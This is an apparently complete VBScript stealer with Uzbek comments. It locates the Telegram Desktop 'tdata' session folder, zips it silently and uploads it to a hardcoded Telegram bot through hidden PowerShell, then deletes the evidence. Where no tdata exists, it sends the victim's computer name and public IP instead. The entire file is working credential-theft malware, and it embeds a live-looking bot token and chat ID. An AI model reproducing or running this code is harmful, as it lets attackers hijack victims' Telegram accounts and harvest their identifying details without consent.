' HECH QANDAY PYTHON KERAK EMAS!
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set ShellApp = CreateObject("Shell.Application")

' Telegram Token va Chat ID (Hammasi VBS ichida!)
BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = "7080045924"

' Kompyuter nomini olish
Set WshNetwork = CreateObject("WScript.Network")
PCName = WshNetwork.ComputerName

' tdata papkasini qidirish
AppData = WshShell.ExpandEnvironmentStrings("%APPDATA%")
TDataPath = AppData & "\TelegramDesktop\tdata"

If FSO.FolderExists(TDataPath) Then
    ' Zip fayl yaratish
    TempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
    ZipName = "tdata_" & PCName & ".zip"
    ZipPath = TempDir & "\" & ZipName
    
    ' 1. Bo'sh ZIP fayl yaratish
    Set zipFile = FSO.CreateTextFile(ZipPath, True)
    zipFile.Write("PK" & Chr(5) & Chr(6))
    zipFile.Close
    
    ' 2. tdata papkasini ZIP ga qo'shish (VBS-da bu qiyin, ziplib foydalanamiz)
    ' Bu yerda Windows-ning o'rnatilgan ZIP mexanizmi ishlatiladi
    Set objShell = CreateObject("Shell.Application")
    Set objFolder = objShell.NameSpace(TDataPath)
    Set objZip = objShell.NameSpace(ZipPath)
    
    ' Papka ichidagi barcha narsalarni ZIP ga ko'chirish
    On Error Resume Next
    objZip.CopyHere objFolder.Items, 16 ' 16 = silent mode
    On Error GoTo 0
    
    ' 3. Telegramga yuborish
    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument' -Method Post -ContentType 'multipart/form-data' -Form @{chat_id='" & CHAT_ID & "'; document=@'" & ZipPath & "' ; caption='✅ tdata yigildi! Kompyuter: " & PCName & "'}""", 0, True
    
    ' ZIP ni o'chirish
    FSO.DeleteFile(ZipPath)
Else
    ' tdata topilmasa, faqat IP yuborish
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.open "GET", "https://api.ipify.org", False
    http.send
    ip = http.responseText
    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -ContentType 'application/json' -Body '{\""chat_id\"":" & CHAT_ID & ", \""text\"": \""⚠️ tdata topilmadi! Kompyuter: " & PCName & ", IP: " & ip & "\""}'""", 0, True
End If
